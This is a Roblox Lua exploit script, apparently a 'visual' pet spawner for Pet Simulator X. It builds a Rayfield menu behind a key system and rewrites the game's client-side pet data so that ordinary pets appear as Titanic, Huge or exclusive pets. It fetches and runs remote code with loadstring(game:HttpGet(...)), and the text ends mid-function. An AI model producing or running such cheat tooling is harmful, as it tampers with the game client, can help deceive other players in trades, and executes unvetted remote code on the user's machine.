if getgenv().executed then return end
getgenv().executed = true
_G.SW = true
httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
    HttpPost
local Rayfield = loadstring(game:HttpGet(
    'https://raw.githubusercontent.com/shlexware/Rayfield/219b39f85127e9c344becc0fa389e2888337637c/source'))() -- don't change this one please it may break your script
local Window = Rayfield:CreateWindow({
    Name = "TheVisualRats + ( TECH RATS )",
    LoadingTitle = "RATS Visiual...",
    LoadingSubtitle = "by UR MOM",
    ConfigurationSaving = {
        Enabled = False,
        FolderName = "Important", -- Create a custom folder for your hub/game
        FileName = "saved config"
    },
    Discord = {
        Enabled = true,
        Invite = "were banned", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD.
        RememberJoins = true  -- Set this to false to make them join the discord every time they load it up
    },
    KeySystem = true,          -- Set this to true to use our key system
    KeySettings = {
        Title = "ITS FREE SCRIPT",
        Subtitle = "Key System ( you only put key once )",
        Note = "KEY: TechRatsandUrMOM",
        FileName = "TexhRATS",
        SaveKey = true,
        GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
        Key = "TechRatsandUrMOM"
    }
})


Names = {}
-- Notifying Functions
local v2 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network).Invoke
local singstop

-- Titanics

local titanicsh
local ttvarient
local ogvarient
local tthc
-- Huges

local hugesh
local hvarient
local oghuge
local hugehc
-- Exclusives

local excsh
local excvarient
local ogexc
local exchc
-- Banana

local bananash
local bvarient
local ogbanana
local bananahc
local function wrong()
    Rayfield:Notify({
        Title = "Wrong Pet",
        Content = "Please Enter A Valid Pet Name",
        Duration = 1,
        Image = 9003576350,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function wrong2()
    Rayfield:Notify({
        Title = "No Pet",
        Content = "Please Enter A Pet Name",
        Duration = 1,
        Image = 9003568230,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function nothuge()
    Rayfield:Notify({
        Title = "Not A Huge Pet",
        Content = "Please Put A Huge Pet",
        Duration = 1,
        Image = 9003575074,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function nottext()
    Rayfield:Notify({
        Title = "No Text",
        Content = "Please Enter A Text",
        Duration = 1,
        Image = 8997529686,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
-- Other Functions

function table_contains(tbl, x)
    found = false
    for _, v in pairs(tbl) do
        if v == x then
            found = true
        end
    end
    return found
end

function deletevalues(tbl, value)
    for k, v in pairs(tbl) do
        if v ~= value then
            tbl[k] = nil
        end
    end
end

function removeValueFromTable(table, value)
    for key, val in pairs(table) do
        if val == value or key == value then
            table[key] = nil
            return true
        end
    end
    return false
end

-- Enchanting Fucntions
function ttenchant()
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    TitanicList = {}
    TList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.titanic then
            table.insert(TitanicList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(TitanicList, v["id"]) ~= nil then
            if not ogvarient then
                if ttvarient == nil or ttvarient == "Normal" then
                    v.g = nil
                    v.r = nil
                    v.dm = nil
                elseif ttvarient == "Golden" then
                    v.g = true
                    v.r = nil
                    v.dm = nil
                elseif ttvarient == "Rainbow" then
                    v.g = nil
                    v.r = true
                    v.dm = nil
                elseif ttvarient == "Dark Matter" then
                    v.g = nil
                    v.r = nil
                    v.dm = true
                end
                if titanicsh then
                    v.sh = true
                else
                    v.sh = nil
                end
                if tthc then
                    v.hc = true
                else
                    v.hc = nil
                end
            end
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Titanic"
            v.powers[1][2] = 1
            if v.nk == nil then
                v.nk = "Rizzhub"
            end
            table.insert(TList, v["uid"])
        end
        for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic:GetDescendants()) do
            if table_contains(TList, V.Name) then
                V:Destroy()
            end
        end
        for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
            if table_contains(TList, V.Name) then
                V:Destroy()
            end
        end
    end
    spawn(function()
        while task.wait(0.01) do
            ETList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.titanic then
                    table.insert(ETList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(ETList, v["id"]) ~= nil then
                    if not v.powers then
                        v.powers = {}
                    end
                    if not v.powers[1] then
                        v.powers[1] = {}
                    end
                    if not v.powers[2] then
                        v.powers[2] = {}
                        v.powers[2][1] = "Strength"
                        v.powers[2][2] = math.random(1, 5)
                    end
                    v.powers[1][1] = "Titanic"
                    v.powers[1][2] = 1
                    v.powers[3] = nil
                end
            end
        end
    end)
end

function henchant(hname, lname)
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    HugeList = {}
    HList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == hname or v.name == lname then
            table.insert(HugeList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(HugeList, v["id"]) ~= nil then
            if not oghuge then
                if hvarient == nil or hvarient == "Normal" then
                    v.g = nil
                    v.r = nil
                    v.dm = nil
                elseif hvarient == "Golden" then
                    v.g = true
                    v.r = nil
                    v.dm = nil
                elseif hvarient == "Rainbow" then
                    v.g = nil
                    v.r = true
                    v.dm = nil
                elseif hvarient == "Dark Matter" then
                    v.g = nil
                    v.r = nil
                    v.dm = true
                end
                if hugesh then
                    v.sh = true
                else
                    v.sh = nil
                end
                if hugehc then
                    v.hc = true
                else
                    v.hc = nil
                end
            end
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Best Friend"
            v.powers[1][2] = 1
            if v.nk == nil then
                v.nk = "Rizzhub"
            end
            table.insert(HList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(HList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(HList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            HHList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.huge then
                    table.insert(HHList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(HHList, v["id"]) ~= nil then
                    if not v.powers then
                        v.powers = {}
                    end
                    if not v.powers[1] then
                        v.powers[1] = {}
                    end
                    if not v.powers[2] then
                        v.powers[2] = {}
                        v.powers[2][1] = "Strength"
                        v.powers[2][2] = math.random(1, 5)
                    end
                    v.powers[1][1] = "Best Friend"
                    v.powers[1][2] = 1
                    v.powers[3] = nil
                end
            end
        end
    end)
end

function excenchant(excname, fppname)
    tttohugecheck = false
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    ExcList = {}
    EList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == excname or v.name == fppname then
            table.insert(ExcList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(ExcList, v["id"]) ~= nil then
            if not ogexc then
                if excvarient == nil or excvarient == "Normal" then
                    v.g = nil
                    v.r = nil
                    v.dm = nil
                elseif excvarient == "Golden" then
                    v.g = true
                    v.r = nil
                    v.dm = nil
                elseif excvarient == "Rainbow" then
                    v.g = nil
                    v.r = true
                    v.dm = nil
                elseif excvarient == "Dark Matter" then
                    v.g = nil
                    v.r = nil
                    v.dm = true
                end
                if excsh then
                    v.sh = true
                else
                    v.sh = nil
                end
                if exchc then
                    v.hc = true
                else
                    v.hc = nil
                end
            end
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Companion"
            v.powers[1][2] = 2
            if v.nk == nil then
                v.nk = "Rizzhub"
            end
            table.insert(EList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(EList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(EList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            EEList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.name == excname and not v.huge and not v.titanic and not v.isGift and v.name ~= "banana" then
                    table.insert(EEList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(EEList, v["id"]) ~= nil then
                    if not v.powers then
                        v.powers = {}
                    end
                    if not v.powers[1] then
                        v.powers[1] = {}
                    end
                    if not v.powers[2] then
                        v.powers[2] = {}
                        v.powers[2][1] = "Strength"
                        v.powers[2][2] = math.random(1, 5)
                    end
                    v.powers[1][1] = "Companion"
                    v.powers[1][2] = 2
                    v.powers[3] = nil
                end
            end
        end
    end)
end

function bananaenchant()
    local randomValue
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    BananaList = {}
    BList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == "banana" or v.name == "Dog" then
            table.insert(BananaList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(BananaList, v["id"]) ~= nil then
            if not ogbanana then
                if bvarient == nil or bvarient == "Normal" then
                    v.g = nil
                    v.r = nil
                    v.dm = nil
                    v.s = 2
                elseif bvarient == "Golden" then
                    v.g = true
                    v.r = nil
                    v.dm = nil
                    v.s = math.random(8, 9)
                elseif bvarient == "Rainbow" then
                    v.g = nil
                    v.r = true
                    v.dm = nil
                    v.s = math.random(15, 17)
                elseif bvarient == "Dark Matter" then
                    v.g = nil
                    v.r = nil
                    v.dm = true
                    v.s = math.random(44, 46)
                end
                if bananash then
                    v.sh = true
                    v.s = v.s * 2.5
                else
                    v.sh = nil
                end
                if bananahc then
                    v.hc = true
                else
                    v.hc = nil
                end
            end
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            local value1 = "Royalty"
            local value2 = "Magnet"
            local value3 = "Glittering"

            local randomIndex = math.random(1, 3)
            if randomIndex == 1 then
                randomValue = value1
            elseif randomIndex == 2 then
                randomValue = value2
            else
                randomValue = value3
            end
            v.powers[1][1] = randomValue
            v.powers[1][2] = 1
            v.powers[2] = nil
            if v.nk == nil then
                v.nk = "Rizzhub"
            end
            table.insert(BList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(BList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(BList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            BBList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.name == "banana" then
                    table.insert(BBList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(BBList, v["id"]) ~= nil then
                    if not v.powers then
                        v.powers = {}
                    end
                    if not v.powers[1] then
                        v.powers[1] = {}
                    end
                    local value1 = "Royalty"
                    local value2 = "Magnet"
                    local value3 = "Glittering"
                    local randomValue
                    if randomIndex == 1 then
                        randomValue = value1
                    elseif randomIndex == 2 then
                        randomValue = value2
                    else
                        randomValue = value3
                    end
                    v.powers[1][1] = randomValue
                    v.powers[1][2] = 1
                    v.powers[2] = nil
                    v.powers[3] = nil
                end
            end
        end
    end)
end

function giftenchant(gfname, pname)
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    GiftList = {}
    GList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == gfname or v.name == pname then
            table.insert(GiftList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(GiftList, v["id"]) ~= nil then
            v.powers = nil
            v.snk = nil
            v.nk = nil
            v.g = nil
            v.r = nil
            v.dm = nil
            v.sh = nil
            v.hc = nil
            table.insert(GList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(GList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(GList, V.Name) then
            V:Destroy()
        end
    end
end

function sign()
    spawn(function()
        while singstop do
            task.wait(0.1)
            if game:GetService("Players").LocalPlayer.PlayerGui.Rename.Frame.SignInfo.Visible == false then
                game:GetService("Players").LocalPlayer.PlayerGui.Rename.Frame.SignInfo.Visible = true
            end
            local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local y = {}
            for i, v in pairs(pets) do
                y[v["uid"]] = false
            end
            for i, v in pairs(pets) do
                if v.nk == getgenv().newtext and v.snk ~= true then
                    v.snk = true
                end
            end
        end
    end)
end

-- Titanics

local fpet
local fpetID
local Tab = Window:CreateTab("Titanics", 12378209702) -- Title, Image
local Paragraph = Tab:CreateParagraph({
    Title = "Requirements",
    Content =
    [[

You Can Change Multiple Pets
Use The Grid Toggle To Update The Pets
You Can Use Any Pet You Want Dm K4F#0001 Any Errors
]]
})

local Input = Tab:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Party Dog",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID = nil
        if Text == "" or Text == nil then
            fpet = nil
        else
            fpet = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet) then
                fpetID = string.split(v.Name, " - ")[1]
            end
        end
    end,
})
local Section = Tab:CreateSection("Pet Variants")
local Toggle = Tab:CreateToggle({
    Name = "Original Pet Variants",
    CurrentValue = true,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        ogvarient = Value
    end,
})
local Dropdown = Tab:CreateDropdown({
    Name = "Varient",
    Options = { "Normal", "Golden", "Rainbow", "Dark Matter" },
    CurrentOption = "Choose",
    Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        ttvarient = Option
    end,
})
local Toggle = Tab:CreateToggle({
    Name = "Shiny",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        titanicsh = Value
    end,
})
local Toggle = Tab:CreateToggle({
    Name = "Hardcore",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        tthc = Value
    end,
})
-- Titanic Replacament
local titanicname
function TitanicChange()
    if fpetID == nil and fpet ~= nil then
        wrong()
    elseif fpet == nil then
        wrong2()
    end
    if fpet ~= nil and fpetID ~= nil then
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local titanicsm = string.split(v.Name, " - ")[2]
            if titanicsm == tostring(titanicname) then
                local titanicID = string.split(v.Name, " - ")[1]
                local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[fpetID .. " - " .. fpet]
                    ["Pet Data (" .. fpet .. ")"])
                v1.name = titanicname
                v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [titanicID .. " - " .. titanicname]
                    .Pet
                v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [titanicID .. " - " .. titanicname].Golden
                local v11 = {}
                v11.random = {}
                v1.sounds = v11
                v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                v1.titanic = true
                v1.isGift = false
                v1.giftEggId = nil
                v1.giftCallback = nil
                v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                v1.darkMatterThumbnail = ""
                v1.rarity = "Exclusive"
                v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                v1.tradeable = true
                v1.strengthMin = 2
                v1.strengthMax = 3
                v1.weld = require(v:FindFirstChildOfClass("ModuleScript")).weld
                v1.petFlyHeight = require(v:FindFirstChildOfClass("ModuleScript")).petFlyHeight
                v1.ridingGravity = require(v:FindFirstChildOfClass("ModuleScript")).ridingGravity
                v1.ridingJumpPower = require(v:FindFirstChildOfClass("ModuleScript")).ridingJumpPower
                v1.ridingCameraOffset = require(v:FindFirstChildOfClass("ModuleScript")).ridingCameraOffset
                v1.ridingTransparency = require(v:FindFirstChildOfClass("ModuleScript")).ridingTransparency
                v1.ugc = nil
                ttenchant()
                break
            end
        end
    end
end

local titanics = {}
local htitanics = {}
for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetDescendants()) do
    if v:FindFirstChildOfClass("ModuleScript") then
        if require(v:FindFirstChildOfClass("ModuleScript")).titanic then
            if require(v:FindFirstChildOfClass("ModuleScript")).hidden then
                table.insert(htitanics, require(v:FindFirstChildOfClass("ModuleScript")).name)
            else
                table.insert(titanics, require(v:FindFirstChildOfClass("ModuleScript")).name)
            end
        end
    end
end
local max = #titanics + 1
local number = 1
local Section = Tab:CreateSection("Normal Titanics")
while task.wait() do
    local titanic = titanics[number]
    local Button = Tab:CreateButton({
        Name = titanic,
        Callback = function()
            titanicname = titanic
            TitanicChange()
        end,
    })
    number = number + 1
    if number == max then
        print('done')
        break
    end
end
local Section = Tab:CreateSection("Admin Titanics")
local hmax = #htitanics + 1
local hnumber = 1
while task.wait() do
    local titanic = htitanics[hnumber]
    local Button = Tab:CreateButton({
        Name = titanic,
        Callback = function()
            titanicname = titanic
            TitanicChange()
        end,
    })
    hnumber = hnumber + 1
    if hnumber == hmax then
        print('done2')
        break
    end
end
local Tab2 = Window:CreateTab("Huges", 12371216119) -- Title, Image
local Paragraph2 = Tab2:CreateParagraph({
    Title = "Note :",
    Content =
    [[

You Can Change Multiple Pets
Use The Grid Toggle To Update The Pets
You Can Use Any Pet You Want Dm K4F#0001 Any Errors
]]
})
local fpet2
local fpetID2
local Input2 = Tab2:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Party Dog",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID2 = nil
        if Text == "" or Text == nil then
            fpet2 = nil
        else
            fpet2 = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet2) then
                fpetID2 = string.split(v.Name, " - ")[1]
            end
        end
    end,
})
local Huge
local HugeID
function CheckHuge(Text)
    HugeID = nil
    if Text == "" or Text == nil then
        Huge = nil
    else
        Huge = Text
    end
    for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
        local fpetcsm = string.split(v.Name, " - ")[2]
        if fpetcsm == tostring(Huge) then
            HugeID = string.split(v.Name, " - ")[1]
        end
    end
end

local Section = Tab2:CreateSection("Pet Variants")
local Toggle = Tab2:CreateToggle({
    Name = "Original Pet Variants",
    CurrentValue = true,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        oghuge = Value
    end,
})
local Dropdown = Tab2:CreateDropdown({
    Name = "Varient",
    Options = { "Normal", "Golden", "Rainbow", "Dark Matter" },
    CurrentOption = "Choose",
    Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        hvarient = Option
    end,
})
local Toggle = Tab2:CreateToggle({
    Name = "Shiny",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        hugesh = Value
    end,
})
local Toggle = Tab2:CreateToggle({
    Name = "Hardcore",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        hugehc = Value
    end,
})
function HugeChange()
    getgenv().hugecheck = false
    if fpetID2 == nil and fpet2 ~= nil or HugeID == nil and Huge ~= nil then
        wrong()
    elseif fpet2 == nil or Huge == nil then
        wrong2()
    end
    if fpet2 ~= nil and fpetID2 ~= nil and Huge ~= nil and HugeID ~= nil then
        local petname = Huge
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local titanicsm = string.split(v.Name, " - ")[2]
            if titanicsm == tostring(petname) then
                local titanicID = string.split(v.Name, " - ")[1]
                if require(v:FindFirstChildOfClass("ModuleScript")).huge then
                    hugecheck = true
                else
                    hugecheck = false
                end
                break
            end
        end
        if hugecheck then
            table.insert(Names, petname)
            task.wait(0.01)
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local titanicsm = string.split(v.Name, " - ")[2]
                if titanicsm == tostring(petname) then
                    local HugeI = string.split(v.Name, " - ")[1]
                    local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [fpetID2 .. " - " .. fpet2]
                        ["Pet Data (" .. fpet2 .. ")"])
                    v1.name = petname
                    v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [HugeI .. " - " .. petname]
                        .Pet
                    v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [HugeI .. " - " .. petname].Golden
                    local v11 = {}
                    v11.random = {}
                    v1.sounds = v11
                    v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                    v1.huge = true
                    v1.titanic = false
                    v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                    v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                    v1.darkMatterThumbnail = ""
                    v1.rarity = "Exclusive"
                    v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                    v1.tradeable = true
                    v1.strengthMin = 2
                    v1.strengthMax = 3
                    v1.isGift = false
                    v1.giftEggId = nil
                    v1.giftCallback = nil
                    v1.hidden = false
                    henchant(petname, fpet2)
                    break
                end
            end
        else
            nothuge()
        end
    end
end

local Section = Tab2:CreateSection("Huge Input & Replace")

local Input3 = Tab2:CreateInput({
    Name = "The Huge Pet",
    PlaceholderText = "Huge Angelus",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        CheckHuge(Text)
    end,
})
local Button = Tab2:CreateButton({
    Name = "Replace",
    Callback = function()
        HugeChange()
    end,
})
local Section = Tab2:CreateSection("Admin Huges")
local Button = Tab2:CreateButton({
    Name = "Huge Lovemelon",
    Callback = function()
        Huge = "Huge Lovemelon"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Hippomelon",
    Callback = function()
        Huge = "Huge Hippomelon"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Coin",
    Callback = function()
        Huge = "Huge Coin"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Pink Lucky Block",
    Callback = function()
        Huge = "Huge Pink Lucky Block"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Rainbow Lucky Block",
    Callback = function()
        Huge = "Huge Rainbow Lucky Block"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Samurai Bull",
    Callback = function()
        Huge = "Huge Samurai Bull"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Samurai Dragon",
    Callback = function()
        Huge = "Huge Samurai Dragon"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Otter",
    Callback = function()
        Huge = "Huge Otter"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Unicorn",
    Callback = function()
        Huge = "Huge Unicorn"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Tab4 = Window:CreateTab("Gifts/Eggs", 10015952468) -- Title, Image
local Paragraph4 = Tab4:CreateParagraph({
    Title = "Note :",
    Content =
    [[

You Can Change Multiple Pets
Unequip The Pet Before Replacing It
Use The Grid Toggle To Update The Pets
You Can Use Any Pet You Want Dm K4F#0001 Any Errors
]]
})
local fpet4
local fpetID4
local Input4 = Tab4:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Cat",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID4 = nil
        if Text == "" or Text == nil then
            fpet4 = nil
        else
            fpet4 = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet4) then
                fpetID4 = string.split(v.Name, " - ")[1]
            end
        end
    end,
})
local option
local Button = Tab4:CreateButton({
    Name = "Replace",
    Callback = function()
        if fpetID4 == nil and fpet4 ~= nil then
            wrong()
        elseif fpet4 == nil then
            wrong2()
        end
        if fpet4 ~= nil and fpetID4 ~= nil then
            local petname = option
            task.wait(0.01)
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local titanicsm = string.split(v.Name, " - ")[2]
                if titanicsm == tostring(petname) then
                    local HugeI = string.split(v.Name, " - ")[1]
                    local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [fpetID4 .. " - " .. fpet4]
                        ["Pet Data (" .. fpet4 .. ")"])
                    v1.name = petname
                    v1.model = nil
                    v1.modelGold = nil
                    local v11 = {}
                    v11.random = {}
                    v1.sounds = v11
                    v1.fly = nil
                    v1.huge = nil
                    v1.titanic = nil
                    v1.balloon = nil
                    v1.goldenThumbnail = nil
                    v1.darkMatterThumbnail = nil
                    v1.rarity = "Exclusive"
                    v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                    v1.tradeable = true
                    v1.strengthMin = nil
                    v1.strengthMax = nil
                    v1.companionEnchantLevel = nil
                    v1.ignoreConvert = nil
                    v1.isGift = true
                    v1.giftEggId = petname
                    v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    local nametoenchant = petname
                    v1.giftCallback = function(p1, p2)
                    end
